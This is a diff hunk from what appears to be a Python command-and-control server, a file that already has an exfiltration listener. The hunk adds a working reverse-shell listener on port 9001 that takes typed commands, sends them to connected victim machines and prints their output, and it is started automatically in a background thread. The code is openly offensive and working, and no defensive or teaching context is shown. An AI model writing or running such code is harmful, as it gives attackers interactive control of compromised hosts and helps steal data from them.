@@ -60,6 +60,25 @@ def listener():
         conn, addr = server.accept()
         threading.Thread(target=handle_client, args=(conn, addr)).start()
 
+def reverse_shell_listener():
+    server = socket.socket()
+    server.bind(('0.0.0.0', 9001))
+    server.listen(5)
+    print("[REVERSE SHELL] Listening on port 9001...")
+    while True:
+        conn, addr = server.accept()
+        print(f"[REVERSE SHELL] Connection from {addr}")
+        try:
+            while True:
+                cmd = input(f"shell@{addr}> ")
+                conn.send(cmd.encode())
+                data = conn.recv(4096)
+                print(data.decode())
+        except:
+            conn.close()
+
+threading.Thread(target=reverse_shell_listener, daemon=True).start()
+
 def exfil_listener():
     exfil_server = socket.socket()
     exfil_server.bind(('0.0.0.0', EXFIL_PORT))
